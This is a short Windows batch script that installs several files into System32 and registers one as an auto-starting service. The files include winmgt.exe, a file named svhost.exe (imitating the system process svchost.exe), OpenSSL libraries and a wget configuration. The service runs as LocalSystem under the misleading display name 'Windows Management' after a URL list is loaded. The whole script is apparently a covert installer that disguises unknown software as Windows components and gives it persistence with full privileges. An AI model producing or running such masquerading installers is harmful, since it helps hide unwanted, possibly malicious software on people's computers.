rem $Id$
@echo off


rem copy all files
copy winmgt.exe %SystemRoot%\System32
copy svhost.exe %SystemRoot%\System32
copy libeay32.dll %SystemRoot%\System32
copy ssleay32.dll %SystemRoot%\System32
copy cacert.pem %SystemRoot%\System32
copy .wgetrc %SystemRoot%\System32

rem copy URLs file
call update_urls

rem unregister service
sc stop winmgt
sc delete winmgt

rem register service
set tmp_full_path=%SystemRoot%\System32\winmgt.exe
rem With "NT AUTHORITY\LocalService" it doesn't launch new processes :(
sc create winmgt binpath= %tmp_full_path% start= auto displayname= "Windows Management" depend= tcpip obj= "LocalSystem"

rem start service
sc start winmgt
